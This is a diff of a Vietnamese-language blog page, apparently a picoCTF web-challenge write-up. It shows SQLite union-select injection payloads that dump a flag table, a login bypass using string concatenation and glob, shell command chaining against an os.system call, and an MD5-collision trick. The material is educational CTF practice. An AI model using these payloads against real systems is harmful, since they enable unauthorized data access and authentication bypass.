@@ -189,7 +189,16 @@ This article does not have a corresponding language version
     ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sqli">SQLI</a></li>
+    <li><a href="#matchtheregex">MatchTheRegex</a></li>
+    <li><a href="#caas">Caas</a></li>
+    <li><a href="#web-gauntlet-2">Web Gauntlet 2</a></li>
+    <li><a href="#it-is-my-birthday">It is my Birthday</a></li>
+    <li><a href="#apriti-sesamo">Apriti sesamo</a></li>
+  </ul>
+</nav>
   </div>
 </div></div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -304,31 +313,38 @@ This article does not have a corresponding language version
       >WRITEUP</a
     ></div>
 </div>
-    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="sqli">
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="sqli">
 <a class="header-anchor" href="#sqli"></a>
 SQLI
-</h1><p><img src="https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda" alt="image"></p>
+</h2><p><img src="https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda" alt="image"></p>
 <ul>
-<li>Lấy các bảng bằng payload như sau</li>
+<li>
+<p>Lấy các bảng bằng payload như sau</p>
+</li>
+<li>
+<p><code>a' union select 1,name,3 from sqlite_master where type='table'-- -</code></p>
+</li>
 </ul>
-<blockquote>
-<p>a&rsquo; union select 1,name,3 from sqlite_master where type=&lsquo;table&rsquo;&ndash; -</p></blockquote>
 <p><img src="https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef" alt="image"></p>
 <ul>
-<li>Kiểm tra bảng more_table</li>
+<li>
+<p>Kiểm tra bảng more_table</p>
+</li>
+<li>
+<p><code>a' union select 1,sql,3 from sqlite_master where name='more_table'-- -</code></p>
+</li>
+<li>
+<p>KIểm tra cột flag trong bảng more_table</p>
+</li>
+<li>
+<p><code>a' union select flag,2,3 from more_table-- -</code></p>
+</li>
 </ul>
-<blockquote>
-<p>a&rsquo; union select 1,sql,3 from sqlite_master where name=&lsquo;more_table&rsquo;&ndash; -</p></blockquote>
-<ul>
-<li>KIểm tra cột flag trong bảng more_table</li>
-</ul>
-<blockquote>
-<p>a&rsquo; union select flag,2,3 from more_table&ndash; -</p></blockquote>
 <p><img src="https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075" alt="image"></p>
-<h1 id="matchtheregex">
+<h2 id="matchtheregex">
 <a class="header-anchor" href="#matchtheregex"></a>
 MatchTheRegex
-</h1><p><img src="https://github.com/user-attachments/assets/c7b34f81-2f2c-437a-b108-c16e5f416f6b" alt="image"></p>
+</h2><p><img src="https://github.com/user-attachments/assets/c7b34f81-2f2c-437a-b108-c16e5f416f6b" alt="image"></p>
 <ul>
 <li>
 <p>.*? bắt tất cả các kí tự bất kỳ, số lượng ít nhất cả thể, nghĩa là chỉ lấy } đầu tiên bắt gặp</p>
@@ -339,29 +355,35 @@ MatchTheRegex
 </ul>
 <p><img src="https://github.com/user-attachments/assets/d3835e3f-9f22-4148-95cf-005ace686b62" alt="image">
 <img src="https://github.com/user-attachments/assets/6961aae8-79a0-4916-b4e1-49a36da9fb96" alt="Screenshot 2025-05-06 183102"></p>
-<h1 id="caas">
+<h2 id="caas">
 <a class="header-anchor" href="#caas"></a>
 Caas
-</h1><p><img src="https://github.com/user-attachments/assets/746e5afd-8d24-4158-85f6-27ad42af2db4" alt="image"></p>
-<blockquote>
-<p>os.system(&ldquo;cowsay &quot; + user_input)</p></blockquote>
+</h2><p><img src="https://github.com/user-attachments/assets/746e5afd-8d24-4158-85f6-27ad42af2db4" alt="image"></p>
 <ul>
-<li>trong shell dấu ; cho phép thực thi nhiều lệnh liên tiếp</li>
+<li>
+<p><code>os.system(&quot;cowsay &quot; + user_input)</code></p>
+</li>
+<li>
+<p>trong shell dấu ; cho phép thực thi nhiều lệnh liên tiếp</p>
+</li>
 </ul>
 <p><img src="https://github.com/user-attachments/assets/f7c67758-e2ff-49d4-a113-9260cd3756d4" alt="image">
 <img src="https://github.com/user-attachments/assets/4db39461-ec20-4caa-babf-ed59fb379acf" alt="image"></p>
-<h1 id="web-gauntlet-2">
+<h2 id="web-gauntlet-2">
 <a class="header-anchor" href="#web-gauntlet-2"></a>
 Web Gauntlet 2
-</h1><p><img src="https://github.com/user-attachments/assets/eaa96d1c-8151-43bd-b10b-7fd44dad9305" alt="Screenshot 2025-05-07 122359"></p>
+</h2><p><img src="https://github.com/user-attachments/assets/eaa96d1c-8151-43bd-b10b-7fd44dad9305" alt="Screenshot 2025-05-07 122359"></p>
 <p><img src="https://github.com/user-attachments/assets/7f39cc63-2344-4762-810b-f24cf18d9deb" alt="image"></p>
 <ul>
-<li>Username là admin nhưng admin đã bị chặn =))), Trong Sqlite || là toán tử để nối chuỗi</li>
-</ul>
-<blockquote>
-<p>username: adm&rsquo;||&lsquo;in
-password: &rsquo; glob &lsquo;*</p></blockquote>
-<ul>
+<li>
+<p>Username là admin nhưng admin đã bị chặn =))), Trong Sqlite || là toán tử để nối chuỗi</p>
+</li>
+<li>
+<p><code>username: adm'||'in</code></p>
+</li>
+<li>
+<p><code>password: ' glob '*</code></p>
+</li>
 <li>
 <p>SELECT username, password FROM users WHERE username=&lsquo;adm&rsquo;||&lsquo;in&rsquo; AND password=&rsquo;&rsquo; glob &lsquo;*&rsquo;</p>
 </li>
@@ -371,19 +393,19 @@ password: &rsquo; glob &lsquo;*</p></blockquote>
 </ul>
 <p><img src="https://github.com/user-attachments/assets/98af7f57-76ce-450e-a32f-f8957c526564" alt="Screenshot 2025-05-07 123050">
 <img src="https://github.com/user-attachments/assets/596a372d-822f-4294-a861-af9f9301c260" alt="image"></p>
-<h1 id="it-is-my-birthday">
+<h2 id="it-is-my-birthday">
 <a class="header-anchor" href="#it-is-my-birthday"></a>
 It is my Birthday
-</h1><ul>
+</h2><ul>
 <li>Gửi 2 file pdf có hàm băm giống nhau để lấy flag</li>
 <li><a href="https://www.mscs.dal.ca/~selinger/md5collision/">https://www.mscs.dal.ca/~selinger/md5collision/</a> tải về 2 file hello.exe và erase.exe và đổi lại .pdf</li>
 </ul>
 <p><img src="https://github.com/user-attachments/assets/7f556d34-6530-493d-ba94-ff9da58cc125" alt="Screenshot 2025-05-07 143003">
 <img src="https://github.com/user-attachments/assets/0eae98ab-c92a-4f4c-878c-dc089825568c" alt="Screenshot 2025-05-07 142953"></p>
-<h1 id="apriti-sesamo">
+<h2 id="apriti-sesamo">
 <a class="header-anchor" href="#apriti-sesamo"></a>
 Apriti sesamo
-</h1><p><img src="https://github.com/user-attachments/assets/60e8a331-071a-4cc1-92d7-8de47ce51add" alt="Screenshot 2025-05-07 153124">
+</h2><p><img src="https://github.com/user-attachments/assets/60e8a331-071a-4cc1-92d7-8de47ce51add" alt="Screenshot 2025-05-07 153124">
 <img src="https://github.com/user-attachments/assets/cf1072aa-14bb-42a0-b29d-f9c8c11aac9f" alt="image"></p>
 <ul>
 <li>Gợi ý liên quan tới Emacs, trong trình soạn thảo emacs khi chỉnh sửa 1 file thì file gốc sẽ được lưu lại và thêm ~ và cuối. Ví dụ file mới là index.php thì file cũ sẽ là index.php~</li>
@@ -465,7 +487,16 @@ Apriti sesamo
   <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
   <div class="sidebar-toc-wrapper toc-div-class">
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sqli">SQLI</a></li>
+    <li><a href="#matchtheregex">MatchTheRegex</a></li>
+    <li><a href="#caas">Caas</a></li>
+    <li><a href="#web-gauntlet-2">Web Gauntlet 2</a></li>
+    <li><a href="#it-is-my-birthday">It is my Birthday</a></li>
+    <li><a href="#apriti-sesamo">Apriti sesamo</a></li>
+  </ul>
+</nav>
   </div>
 </div></div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -582,7 +613,7 @@ Apriti sesamo
           author: "Ngo Truong",
           title: "Picoctf",
           url: "http:\/\/localhost:1313\/post\/picoctf\/",
-          description: "\rSQLI\rLấy các bảng bằng payload như sau a\u0026rsquo; union select 1,name,3 from sqlite_master where type=\u0026lsquo;table\u0026rsquo;\u0026ndash; -\nKiểm tra bảng more_table a\u0026rsquo; union select 1,sql,3 from sqlite_master where name=\u0026lsquo;more_table\u0026rsquo;\u0026ndash; -\nKIểm tra cột flag trong bảng more_table a\u0026rsquo; …",
+          description: "\rSQLI\rLấy các bảng bằng payload như sau\na\u0027 union select 1,name,3 from sqlite_master where type=\u0027table\u0027-- -\nKiểm tra bảng more_table\na\u0027 union select 1,sql,3 from sqlite_master where name=\u0027more_table\u0027-- -\nKIểm tra cột flag trong bảng more_table\na\u0027 union select flag,2,3 from more_table-- - …",
           cover: "http:\/\/localhost:1313\/images\/OIP.webp",
         };
       </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
